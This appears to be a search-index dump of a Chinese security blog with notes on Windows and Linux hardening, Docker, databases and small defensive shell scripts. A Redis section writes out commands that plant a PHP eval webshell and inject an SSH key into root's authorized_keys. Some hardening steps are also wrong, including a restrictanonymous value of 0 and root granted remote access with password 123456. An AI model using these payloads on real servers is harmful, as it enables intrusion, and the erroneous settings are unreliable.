交互式登录：可被缓存的前次登录个数（设置缓存数为0，此项对域服务器无效。）\n\n目的：登陆时不显示上次的用户名，防止暴露用户名\n\n- 网络访问：不允许为网络身份验证储存凭证或 .NET passports(启用）\n- 审核：如果无法记录安全审核则立即关闭系统 （启用）\n- 审核：对全局系统对象的访问进行审核（启用）\n- 网络访问：本地账户的共享和安全模式：仅来宾--本地账户以来宾用户身份验证\n- 网络访问：可匿名访问的共享（全部删除）\n- 网络访问：可匿名访问的命名管道 （全部删除）\n- 网络访问：可远程访问的注册表路径（全部删除）\n- 网络访问：可远程访问的注册表路径和子路径 （全部删除）\n\n**用户权限策略设置**\n\n- 通过终端服务拒绝登陆”中加入Guests、User组\n- “通过终端服务允许登陆”中只加入Administrators组\n- “从网络访问此计算机”中删除PowerUsers和BackupOperators\n- “拒绝本地登录”中添加web和guest用户\n\n#### 6、NTFS安全\n\n**Windows权限的继承性、累加性、优先性、交叉性四项基本原则**\n\n- Windows NT以后的文件，及文件夹共享设置有以下特性：继承性、累加性、优先性、交叉性。\n- 继承性：下级的目录在没有经过重新设置之前，是拥有上一级目录权限设置的。\n- 累加性：是说如一个组GROUP1中有两个用户USER1、USER2，他们同时对某文件或目录的访问权限分别为“读取”和“写入”，那么组GROUP1对该文件或目录的访问权限就为USER1和USER2的访问权限之和。\n- 优先性：权限的这一特性又包含两种子特性，其一是文件的访问权限优先目录的权限，也就是说文件权限可以越过目录的权限，不顾上一级文件夹的设置。另一特性就是“拒绝”权限优先其它权限，也就是说“拒绝”权限可以越过其它所有其它权限，一旦选择了“拒绝”权限，则其它权限也就不能取任何作用，相当于没有设置。\n- 交叉性：指当同一文件夹在为某一用户设置了共享权限的同时又为用户设置了该文件夹的访问权限，且所设权限不一致时，它的取舍原则是取两个权限的交集，也即最严格、最小的那种权限。如目录A为用户USER1设置的共享权限为“只读”，同时目录A为用户USER1设置的访问权限为“完全控制”，那用户USER1的最终访问权限为“只读”。\n\n```\n系统分区C盘                                  administrator、system完全控制\nC:\\Documents and Settings\\                 administrator、system完全控制\nC:\\windows\\system32\\                     administrator读写\nC:\\progran files    为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制\nC:\\windows            系统管理员完全控制、system拒绝(继承)\nC:\\windows\\system32    其关键程序只允许administrator完全控制\nC:\\Inetpub\\            administrator、system完全控制，必要时可以删除该目录\n网站目录所在磁盘       administrator、system完全控制\n```\n\n#### 7、注册表安全设置\n\n```\nHKEY_LOCAL_MACHINE   包含关于本地计算机系统的信息，包括硬件和操作系统数据。\nHKEY_LOCAL_ROOT          包含各种OLE技术使用的信息技术和文件类别关联数据\nHKEY_LOCAL_USER           包含环境变量、桌面设置、网络连接、打印机和程序首选项。\nHKEY_LOCAL_USERS         包含关于动态加载的用户配置文件和默认的配置文件的信息，有些信息和HKEY_CURRENT_USER交叉出现\nHKEY_CURRENT_CONFIG  包含在启动时由本地计算机系统使用的硬件配置文件的相关信息。\n```\n\n**禁止自动登录**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon  /d 0 /f\n\n```\n\n**启用源路由欺骗保护**\n\n```\nreg add \" System\\CurrentControlSet\\ Services\\Tcpip\\Parameters\\ \" /v DisableIPSourceRouting   /t REG_DWORD /d 2 /f\n```\n\n**禁止空链接**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous  /d 0 /f\n\n```\n\n**删除系统默认共享**\n\n```\n#查看默认共享\nnet share\n#删除默认共享\nnet share <共享名> /del\n\n# 默认共享 在其他主机输入IP，用户名和密码可访问共享\n```\n\n**修改默认3389远程端口**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\" /v PortNumber  /d 4445 /f\n\n```\n\n**关闭135.139.445隐患端口**\n\n```\n防火墙->新建规则->端口->阻止连接\n135 RPC服务\n139 局域网文件和打印机共享协议\n445 SMB协议的文件共享\n\n```\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Linux系统安全配置","url":"/2023/06/04/Linux系统安全配置/","content":"\n\n### Linux系统安全配置\n\n#### 系统权限\n\n##### 1、安装操作系统\n\n1、选择稳定版操作系统\n\n2、最小化安装（后期方便安装应用）\n\n3、不要安装gcc ，make（防止黑客进入以后方便操作）\n\n4、安装系统后更新系统 \n\n```shell\nyum -y update\n```\n\n##### 2、文件权限\n\n- 文件夹默认权限  755   777-022 \n\n- 文件默认权限 644       666-022\n\n​       /root   550\n\n​       /etc/passwd   644\n\n​       /etc/shadow  000\n\n\n\n- ###### 冒险位是什么\n\n当一个二进制可执行文件被分配了 SUID 标志位后，该程序就可以以该文件所有者的身份来运行，即使它被其他用户执行。通常情况下，只有一些特定的二进制可执行文件需要使用 setuid 来工作。\n\n本身普通用户jack 不用 less  /etc/shadow 查看\n\n![image-20230604213028261](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604213028261.png)\n\n给less加了冒险位以后，less 以该文件所有者的身份运行，从而可以查看/etc/shadow。\n\n\n\n- ###### sgid强制位是什么\n\n对目录生效，在此目录创建文件自动归入目录所在组\n\n```shell\nchmod 2777 dirname\n```\n\n如下图所示，xxx目录被设置了强制位，那么即便root用户在该目录创建了一个文件，但是其所属组仍然是jack\n\n![image-20230604213932793](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604213932793.png)\n\n- ###### sticky粘制位是什么\n\n目录中的文件只能被文件拥有者删除\n\n```shell\nchmod 1777 dirname\n```\n\n- 文件ACL  getfack  setfacl   设置了acl的有+ \n\n  ```shell\n  # 设置acl权限\n  setfacl -m -u:usename:权限  filename    \n  # 查看acl权限\n  getfacl filename\n  # 删除acl权限\n  setfacl -x -u:usename  filename\n  setfacl -b filename\n  ```\n\n  ![image-20230604215439043](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604215439043.png) \n\n  \n\n- ###### 文件属性chattr lsattr \n\n  ```shell\n  chattr +a filename    文件只能追加不能删除\n  \n  lsattr filename      查看文件属性\n  \n  chattr -a filename    减去追加权限\n  \n  chattr +i  filename   不允许改变也不运行删除\n  \n  示例  让黑客不能添加用户，可以通过修改passwd文件来\n  chattr +i /etc/passwd 不允许修改，也不允许删除，然后隐藏chattr命令，mv +rename \n  \n  \n  示例 2 \n  \n  find /bin /sbin /usr/bin /usr/sbin /etc/passwd /etc/shadow /etc/pam.d  -type -f -exec chattr +i {} \\;\n  \n  示例3  日志文件防止删除\n  \n  chattr +a /var/log/messages  /var/log/secure\n  如果有日志轮转的话\n  vim /etc/logrotate.d/syslog\n  prerotate\n      chattr -a /var/log/messages\n  endscript\n  ......\n  prerotate\n      chattr +a /var/log/messages\n  endscript\n  \n  ```\n\n  ![image-20230604220031131](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604220031131.png)\n\n##### 3、用户授权\n\n- ###### su \n\n\n```\n# 切换到用户jack 并同时切到用户目录\nsu - jack  # 而不是su jack（在当前目录切换）\n\n```\n\n- ###### sudo\n\n\n```shell\n# 修改用户\nvisudo   = vim /etc/sudoers\n修改语法如下：\njack    ALL=NOPASSWD: /usr/sbin/ip,/usr/sbin/fdisk,/usr/bin/less\n\n\n# 修改用户组\ngroupadd smartgo\nuseradd it01 -G smartgo\n\n%smartgo        ALL=NOPASSWD: /usr/sbin/ip\n%smartgo        ALL=NOPASSWD: /usr/sbin/useradd, /user/sbin/userdel,/bin/passwd\n%smartgo        ALL=NOPASSWD: !/usr/bin/rm\n%smartgo        ALL=NOPASSWD: !/bin/passwd root, !/bin/passwd root --stdin, !/bin/passwd --stdin root\n```\n\n- ###### sudo 日志\n\n```shell\ncat /etc/rsyslog.conf |grep '^authpriv\nauthpriv.*                                              /var/log/secure\n\n```\n\n![image-20230605220654457](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230605220654457.png)\n\n##### 4、用户认证\n\n- PAM认证\n\n  - gdm 认证、kdm 认证\n\n  - su 认证\n\n  - ssh 认证\n  - ftp\n  - samba\n\n- 自带数据库验证方式 Mysql\n- Web验证方式 （httppasswd）\n\nPAM  (Pluggable Authentication Modules) 可拔插认证式模块。\n\n四种认证类型\n\n- auth   认证管理   验证使用者身份，账户和密码  \n- account 用户管理 基于用户时间或者密码有限期来决定是否允许访问\n- password 密码（口令）认证管理 禁止用户反复尝试登陆，在变更密码时进行密码复杂性控制\n- session    会话管理    进行日志记录，或者限制用户登陆的次数，资源限制\n\n流程标记\n\n```shell\nRequired    (必要条件)   验证失败，仍然继续，最后仍然返回Fail\n\nRequisite   （必要条件）  验证失败立即结束\n\nSufficient  （充分条件）  验证成功立即返回，否则忽略结果继续\n\nOptional    （可选条件）  结果不影响\n\nInclude                 包含另外一个配置条件相同的行\n\nSubstack                垂直叠加\n```\n\n- PAM 常用模块\n\n  - pam_rootok.so     /etc/pam.d/su\n\n    示例 限制root 切换到其他用户也需要密码\n\n    ```shell\n    [root@192 ~]# cat /etc/pam.d/su\n    #%PAM-1.0\n    auth            sufficient      pam_rootok.so   \n    这一行注释了就代表从root 切换到其他用户也需要密码\n    [root@192 ~]# cat /etc/pam.d/su\n    #%PAM-1.0\n    auth            sufficient      pam_rootok.so\n    ```\n\n  - pam.access.so\n\n    ```shell\n    访问控制，配置文件 \n    \n    修改 /etc/pam.d/sshd\n    \n    新增\n    \n    Auth   required  pam.access.so\n    \n    修改 /etc/security/access.conf\n    \n    # 例如 限制用户从哪些网段登录\n    \n    # -代表deny 后面跟用户 +地址\n    \n    -:root:192.168.2.30 \n    +:root:192.168.2.0/24 EXCEPT 192.168.2.1\n    \n    \n    ```\n\n  \n  - pam_time.so\n  \n    ```shell\n    基于时间的访问控制，默认配置文件在  /etc/security/time.conf\n    \n    grep time /etc/pam.d/sshd\n    \n    account required  pam_time.so  # 新增的内容\n    \n    # 修改  /etc/security/time.conf 实现基于时间的控制\n    \n    ```\n  \n  - pam_tally2.so\n  \n    功能：登录统计\n  \n    ```\n    grep tally /etc/pam.d/sshd\n    auth required pam_tally2.so deny=3 even_deny_root root_unlock_time=60 unlock_time=60\n    # 查看被锁了多少次\n    pam_tally2 -u\n    # 清空计数\n    pam_tally2 --reset -u root\n    \n    ```\n  \n  - pam 资源限制\n  \n    对用户进行系统资源使用限制\n  \n    pam_limits.so\n  \n    功能：限制用户会话过程中对各种资源的使用情况\n  \n    /etc/security/limits.conf\n  \n    /etc/security/limits.d/*.conf\n    \n    ```\n    # domain  type  item  value\n    jack soft nofile   10240        # 设置jack 用户最大打开文件数10240个\n    ```\n  \n  -  Cgroup 对资源进行限制\n  \n    ```shell\n    yum -y install libcgroup\n    systemctl enable cgconfig\n    systemctl start cgconfig\n    man cgconfig.conf\n    \n    vim /etc/cgconfig.conf\n    group  lesscpu {\n           cpu{\n           cpu.shares=200(ms);\n           }\n    }\n    group  morecpu {\n           cpu{\n           cpu.shares=800(ms);\n           }\n    }\n    cgexec -g cpu:lesscpu sha1sum /dev/zero\n    cgexec -g cpu:morecpu md5sum /dev/zero\n    \n    可以看到以上两个进程的CPU 占比大概是1：4 的样子\n    \n    ```\n  \n    \n  \n    ```\n    \n    ```\n  \n    \n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Docker","url":"/2023/04/24/Docker_new/","content":"\n            \n### Docker--常用操作命令\n\n1、对比虚拟机\n\n- 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动\n\n- 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像\n\n- 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源\n\n  \n\n2、安装\n\n```shell\nyum install net-tools\nyum install -y yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\nyum makecache fast\nyum -y install docker-ce\nsystemctl start docker\ndocker info\nsystemctl list-unit-files\nsystemctl list-unit-files |grep docker\n```\n\n2、docker命令\n\n```shell\ndocker ps             # 查看当前运行的容器\ndocker images          # 列举当前的镜像\ndocker search centos   # 查找镜像\ndocker pull hello-world  # 拉取镜像\ndocker create hello-world  # 创建容器\n\n[root@192 ~]# docker create --name your_docker_name hello-world\n56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8\n\ndocker container ls -a # 查看所有的容器\n\n[root@192 ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED          STATUS    PORTS     NAMES\n56ca1631d20a   hello-world   \"/hello\"   44 seconds ago   Created             vibrant_kalam\ndocker run --name your_docker_name hello-world  # 创建并启动容器\n\n```\n\n![image-20230424215554888](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230424215554888.png)\n\n相关网址：\n\nhttps://hub.daocloud.io/","tags":["网络安全"],"categories":["网络安全"]},{"title":"数据库学习","url":"/2023/04/24/数据库学习_new/","content":"\n\n### 1、分类\n\n- 非关系数据库：Memcached/Redis 缓存服务器，将数据保存到内存中以提高访问效率\n\n- 关系数据库：Mysql\n\n### 2、MYSQL数据库常用操作\n\n- 增删查改\n\n\n```shell\ncreate database school character set 'utf8mb4';  #创建数据库\ncreate table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime);  # 创建表\nshow columns from student;                   # 查看表的结构\ndesc student;                                # 查看表的结构\nINSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx)  # 插入数据\n# 插入多条数据以;结尾\n# 删除数据-清空\nTRUNCATE TABLE student;\nDELETE FROM student;\nDELETE FROM student where sid=''; # 删除特定数据，通过where 指定条件\n\n# 更新数据\nUPDATE student SET sname='xxx'; # 也可以加where 条件\n\n```\n\n- Navicat 始终无法连接\n\n解决办法\n\n- ```\n  # 放行3306 ，最大可能就是这个原因\n  firewall-cmd --permanent --zone=public --add-port=3306/tcp\n  firewall-cmd --reload\n  ```\n\n- ```\n  # 给权限允许外部连接\n  GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\n  FLUSH privileges;\n  ```\n\n- ```shell\n  # 设置密码，允许连接\n  update user set host='%' where user='root';\n  set password =password('123456');\n  ```\n\n- \n  约束\n\n  - 主键约束   \n\n  - 外键结束\n\n  - 唯一约束  \n\n\n- 查询语句\n\n```powershell\n# 利用子查询\nSELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));\n# like模糊查询 %代替任意多个字符 _代替一个字符\nSELECT * FROM WHERE sname like '李%'\n# 统计某个列的总和、平均数\nSELECt SUM(age) From student;\nSELECt AVG(age) From student;\n# 查询C10课程排名前5的学生\nSELECT * FROM grade where courseid='c10' order by score DESC limit 5;\n# 保存并列\nSELECT * FROM grade where courseid='c10' and grade in (SELECT grade FROM grade where courseid='c10' order by DESC limit 5);\n\n\n# 分组查询  GROUP BY  自动去重 \nSELECT coursed,AVG(score) FROM grade GROUP BY courseid;\n# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前\nSELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore >70';对的\nSELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore >70';错误\nSELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore >70' GROUP BY courseid :错误\n# 子查询的 语句  ANY  ALL  \nSELECT age FROM student WHERE age <ANY(SELECT DISTINCT(age) From student WHERE degree='xxx')\n# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 \nSELCT classid.calssname FROM class UNION SELECT 'S04','网安3班'\n\n# 多表查询\nSELECT * FROM student ,class where student.studentid = grade.studentid;\nSELECT * FROM student JOIN class ON  student.studentid = grade.studentid;\nSELECT * FROM student INNER JOIN class ON  student.studentid = grade.studentid;\n\n# left join on 和right join on\n# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询\n\n# 索引\n# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢\n# 如何判断索引是否成功\nEXPLAIN SELECT * from customer where phone='xxx'\n# 利用sql语句写到文件\nSELECT “xxx ” INTO OUTFILE '/tmp/xxx'\n\n# 数据库备份\nmysqldump -h127.0.0.1 -ppassword xxx >xx.sql\n# 还原数据库\nmysqldump -h127.0.0.1 -ppassword xxx <xx.sql\n\n```\n\n- 主从复制\n\n\n两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步==》实时备份，读写分离，写数据到Master,读从Salve。\n\n### 3、Redis 数据库\n\n使用最为广泛的缓存服务器，数据保存在内存中，所有的IO操作在内存中，速度非常快，性能非常高。\n\n断电数据消失。\n\n\n\n- 安装与使用\n\n```shell\n# 下载链接 https://redis.io/download/\ntar xzvf redis-7.0.11.tar.gz\ncd redis-7.0.11/ && make && make install\nredis-server ./redis.conf \n\n[root@192 redis-7.0.11]# redis-cli\n127.0.0.1:6379> set name zwj\nOK\n127.0.0.1:6379> get name\n\"zwj\"\n# 设置过期时间\n127.0.0.1:6379> expire name 10\n(integer) 1\n127.0.0.1:6379> exists name\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) 2\n127.0.0.1:6379> ttl name\n(integer) -2\n127.0.0.1:6379> exists name\n(integer) 0\n\n127.0.0.1:6379> ttl name\n(integer) -1\n127.0.0.1:6379> expire name 10\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) 8\n127.0.0.1:6379> PERSIST name\n(integer) 1\n127.0.0.1:6379> ttl name\n(integer) -1\n\n# 按照列进行设置，可用于表格类型的存储  （hash类型数据）\n127.0.0.1:6379> hset user_1 name zwj\n(integer) 1\n127.0.0.1:6379> hset user_1 address chengdu\n(integer) 1\n127.0.0.1:6379> hset user_1 age 19\n(integer) 1\n127.0.0.1:6379> HGET user_1 name\n\"zwj\"\n127.0.0.1:6379> \n# 列表类型的数据\n127.0.0.1:6379> lpush name_list lisi\n(integer) 2\n127.0.0.1:6379> lpush name_list wangwu\n(integer) 3\n127.0.0.1:6379> keys name_list\n1) \"name_list\"\n127.0.0.1:6379> lrange name_list 0 -1\n1) \"wangwu\"\n2) \"lisi\"\n3) \"zhangsan\"\n127.0.0.1:6379> LINDEX name_list 0\n\"wangwu\"\n# 集合类型的数据 （不允许重复） 默认会去重处理 sadd 添加的不排序，zadd 添加的会按照score排序\nsadd key value\n127.0.0.1:6379> sadd set qwer qwer\n(integer) 1            (新增一个)\n127.0.0.1:6379> sadd set qwer 12345\n(integer) 1            （只新增一个）\n127.0.0.1:6379> sadd set 22 33 44 \n(integer) 3            （新增3个）\n127.0.0.1:6379> scard set\n(integer) 5\n127.0.0.1:6379> smembers set\n1) \"33\"\n2) \"22\"\n3) \"12345\"\n4) \"qwer\"\n5) \"44\"\n\n# 清空数据库\nflushdb   # 清空当前  flush 默认16个数据库\nflushall  # 清空所有\n```\n\n- 配置远程连接\n\n```shell\nvim redis.config\n\n注释 bind 127.0.0.1 -::1\n\n取消注释 requiredpass 123456\nfirewalld\n```\n\n- 开放6379 端口\n\n```shell\n[root@192 ~]# firewall-cmd --list-all\npublic (active)\n  target: default\n  icmp-block-inversion: no\n  interfaces: ens33\n  sources: \n  services: dhcpv6-client ssh\n  ports: 3306/tcp\n  protocols: \n  masquerade: no\n  forward-ports: \n  source-ports: \n  icmp-blocks: \n  rich rules: \n\n[root@192 ~]# firewall-cmd --add-port=6379/tcp --permanent \nsuccess\n[root@192 ~]# firewall-cmd --reload\nsuccess\n[root@192 ~]# firewall-cmd --list-all\npublic (active)\n  target: default\n  icmp-block-inversion: no\n  interfaces: ens33\n  sources: \n  services: dhcpv6-client ssh\n  ports: 3306/tcp 6379/tcp\n  protocols: \n  masquerade: no\n  forward-ports: \n  source-ports: \n  icmp-blocks: \n  rich rules: \n```\n\n- 配置后台运行\n\n```shell\nvim redis.conf\n更改 daemonize yes\n```\n\n- redis 持久化\n\n  - rdb 保存\n\n    默认情况下保存在dump.rdb文件中\n\n    更改策略如下：\n\n  ```\n  #   * After 3600 seconds (an hour) if at least 1 change was performed\n  #   * After 300 seconds (5 minutes) if at least 100 changes were performed\n  #   * After 60 seconds if at least 10000 changes were performed\n  #\n  # You can set these explicitly by uncommenting the following line.\n  #\n  # save 3600 1 300 100 60 10000\n  save 60 2    # 一分钟内有两个key发生了变化就备份\n  ```\n\n  - AOF保存\n\n    ```\n    always   每次写入都同步\n    \n    everysec  每秒一次\n    \n    no   系统控制\n    \n    修改 redis.conf\n    \n    appendonly no  更改为yes  默认关闭\n    \n    修改同步策略 默认每秒\n    \n    # appendfsync always\n    appendfsync everysec\n    # appendfsync no\n    ```\n\n  - 主从复制\n\n    配置master和slave\n\n    两台电脑分别配置后台运行，可远程登录，需要密码，日志路径，然后在slave 机器上 masterauth pass\n\n    ```\n    daeminize yes\n    masterauth 123456\n    requirepass 123456\n    logfile redis.log\n    注释掉  bind 127.0.0.1 -：：1\n    ```\n\n    接着在slave 机器上运行slaveeof masterip masterport ，最后用info replication 查看配置情况\n\n  - 安全漏洞相关\n\n    - redis写入webshell\n\n      ~~~shell\n      config set dir /var/www/html\n      config set dbfilename zcc.php\n      set xxx \"\\n\\n\\n<?php @eal($_POST['zcc']);?>\\n\\n\"\n      save\n      \n      \n      攻击者可以通过向受攻击的服务器发送恶意 HTTP POST 请求来利用这段代码。具体步骤如下：\n      \n      1. 获取 Redis 服务器的 IP 地址和端口号。\n      2. 发送一个类似于以下内容的 HTTP POST 请求到服务器：\n      ```\n      POST / HTTP/1.1\n      Host: <Redis 服务器 IP 地址>:<Redis 服务器端口号>\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: <Payload 长度>\n      \n      zcc=<?php phpinfo();?>\n      ```\n      上述请求会将一段 PHP 代码 `<?php phpinfo();?>` 发送给 Redis 数据库，并将其存储到之前设置的名为 \"xxx\" 的键中。\n      \n      3. 在发送完请求后，攻击者可以访问之前指定的目录 `/var/www/html`，并执行 `zcc.php` 文件。该文件中包含了攻击者注入的 PHP 代码，因此会执行 `phpinfo()` 函数并显示当前 PHP 环境的信息。\n      \n      ~~~\n\n    - redis 写入ssh公钥登录\n\n      ```shell\n      ssh-keygen -t rsa \n      config set dir /root/.ssh\n      config set dbfilename authorized_keys\n      set x \"\\n\\n\\n 公钥 \\n\\n\\n\"\n      save\n      ```\n\n      \n\n### 4、Oracle\n\n关系型数据库，企业型数据库，比较复杂，主要掌握和Mysql 数据库的区别，大同小异\n\n- Oracle 的数据库结构   oracle服务->表空间->多个表->各个表结构\n\n- Oracle 的用户\n\n- Oracle 的日期格式，to_date(\"日期\"，‘YYYY-MM-DD HH24:Mi:SS') 转换，输出的时候用to_char(date,‘YYYY-MM-DD HH24:Mi:SS')\n\n- Group By 使用时，聚合函数不能与无关的列放在一起select\n\n- 没有Limit 关键词，要用rownum,虚拟列 如取前10  rownum<=10;\n\n- 没有自增列，要创建序列\n\n  ```mysql\n  select MYSEQ.nextval from dual;\n  insert into demo(id,name) values(MYSEQ.nextval,'zhangsan'); \n  ```\n\n- 备份命令 exp /imp\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"屏蔽SSH远程暴力登录","url":"/2023/04/20/屏蔽SSH远程暴力登录/","content":"\n#### 1、背景\n\n通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知\n\n#### 2、分析问题-解决过程\n\n如何判断SSH远程登录失败\n\n通过查看/var/log/secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录\n\n```\nApr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2\n\n```\n\n```shell\nfailedcount=$(cat /var/log/secure |grep \"Failed password\"|wc -l)\nif [ $failedcount -gt 2 ]; then\n   echo \"too many count\"\n   ip=$(cat /var/log/secure |grep \"Failed\" |awk '{print $11}' |uniq)\n   status_fire=$(firewall-cmd --state)\n   if [ $status_fire != \"running\" ]; then\n      systemctl start firewalld\n   fi\n   firewall-cmd --add-rich-rule='rule family=ipv4 source address=\"$ip\" drop'\n   echo \"$ip 被防火墙阻止\"\n   \nfi\n```\n\npkill 可根据进程名kill 掉进程\n\nwho 可以看到哪些人登录了\n\n![image-20230420224036355](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230420224036355.png)\n\n```\n\n# 实现功能，防火墙禁止访问以及关闭已经连接的session \n\nfailedcount=$(cat /var/log/secure |grep \"Failed password\"|wc -l)\nif [ $failedcount -gt 2 ]; then\n   echo \"too many count\"\n   status_fire=$(firewall-cmd --state)\n   if [ $status_fire != \"running\" ]; then\n      systemctl start firewalld\n   fi\n   ip='ip.txt'\n   cat /var/log/secure |grep \"Failed\" |awk '{print $11}' |uniq >$ip\n   while read line;do\n       firewall-cmd --add-rich-rule='rule family=ipv4 source address=\"$line\" drop'\n       if [ $? -eq 0 ]; then\n          echo \"$line 被防火墙阻止\"\n       else\n         echo \"$line 未能被防火墙阻止\" >alert.log\n         mail -s '重要警告' 2194620553@qq.com <alert.log\n       fi\n       # kill 已经连接的session\n       who|grep $line|awk 'print $2'>tty.log\n       while read xxx;do\n          pkill -kill -t $xxx\n       done < tty.log\n       # who |grep $ip |while read line; do term=$(echo $line|awk '{print $2}');pkill -kill -t $term ; done       \n   done < $ip\n   # 替换掉已经操作的，防止重复操作\n   sed -i 's/Failed password/Failedxxpassword/g' /var/log/secure\n      \nfi\n```\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Linux 文件监控小脚本","url":"/2023/04/18/Linux 文件监控_new/","content":"\n\n### Linux文件监控小脚本\n\n1、通过md5sum 对比\n\n```shell\n# 计算root目录下所有文件的md5 并重定向到origin_md5\nfind /root/* --type f |xargs md5sum > origin_md5\n# 检查文件有没有被修改，导致md5变化\nmdsum -c orign_md5\n```\n\n![image-20230418221659638](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230418221659638.png)\n\n![image-20230418221719095](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230418221719095.png)\n\n2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到\n\n修改了xxx\n\n./origin/anaconda-ks.cfg: OK\n./origin/monitor.sh: OK\n./origin/test.txt: OK\n./origin/xxx: FAILED\nmd5sum: WARNING: 1 computed checksum did NOT match\n\n删除了xxx\n\n./origin/anaconda-ks.cfg: OK\n./origin/monitor.sh: OK\n./origin/test.txt: OK\nmd5sum: ./origin/xxx: No such file or directory\n./origin/xxx: FAILED open or read\nmd5sum: WARNING: 1 listed file could not be read\n\n新增\n\n[root@192 ~]# diff origin after\nOnly in origin: xxx1\n\n\n\n```shell\nmd5_log='./origin_md5'\nif [ $# -eq 2 ]; then\n   origin=$1\n   after=$2\nelif [ $# -eq 3 ]; then\n   origin=$1\n   after=$2\n   new=$3\n   if [ $new = \"new\" ]; then\n      mkdir $after\n      cp $origin/* $after\n      find $origin -type f |xargs md5sum |tee $md5_log\n      exit 0\n   fi\nelse\n   echo \"参数错误\"\n   exit 1\nfi\n\n# 文件新增\ndiff_result=$(diff $origin $after|grep ^Only |sed -e 's/Only in//g' -e 's/: /\\//g')\nif [ $? -eq 0 ]; then\n   echo -e '**文件变化情况**\\n'\"$diff_result\" | tee result.log\n   mail -s \"text\" \"2194620553@qq.com\"< result.log\nfi\n\n# 文件内容修改\ncontent_diff=$(md5sum -c $md5_log 2>/dev/null |grep \"FAILED$\"|sed -e 's/FAILED//g')\nif [ $? -eq 0 ]; then\n   echo -e \"***被修改的文件情况***\\n\"\"$content_diff\" | tee md5_result\n   mail -s \"text\" \"2194620553@qq.com\" <md5_result\nfi\n\n# 文件被删除\ndel_diff=$(md5sum -c $md5_log 2>/dev/null |grep \"FAILED open or read\"|sed -e 's/FAILED open or read//g')\nif [ $? -eq 0 ]; then\n   echo -e \"***被删除的文件情况***\\n\"\"$del_diff\" | tee del_log\n   mail  -s \"test\" \"2194620553@qq.com\" <del_log\nfi\n```\n\n![image-20230420215118633](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230420215118633.png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Linux基础","url":"/2023/04/06/Linux基础_new/","content":"\n            \n\n\n### Linux 基础\n\n1、Centos 7 软件安装\n\n- rpm 安装\n  - rpm -ivh 软件包\n  - rpm -e 软件包\n  - rpm -qa |grep 软件包\n\n- 源码安装\n\n  - 寻找configure setup.sh install.sh \n\n    - ./configure\n    - make \n    - make install\n\n    发现缺少依赖，但是系统已经安装对应的软件，可以尝试安装一下-devel,如pcre-devel\n\n- yum 安装\n  - yum list\n  - yum install\n  - yum repolist  列出当前的源\n  - yum deplist  查看依赖库\n  - yum erase 软件包\n\n2、相关命令\n\nnet-tools 以及iproute2 两套网络相关命令体系\n\n- ip addr add 192.168.101.111/24 dev ens33\n\n  ifconfig ens33 192.168.101.111\n\n  临时增加一个IP地址，一个网卡可以绑定多个IP地址\n\n- ss -anl\n\n  netstat -anlop  列出当前端口占用情况\n\n- traceroute 跟踪路由\n\n- curl -O  url   \n- wget -O xxx URL \n\n- tcpdump\n\n  - tcpdump tcp and dst port 80 -i ens33 -w xx.pcap\n\n\n3、Linux 命令\n\n- tee  命令同时打印到控制台以及文件中\n\n  ![image-20230408212824118](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230408212824118.png)\n\n- 1>file  2>file \n\n  1 代表正确的重定向，2代表错误的重定向\n\n  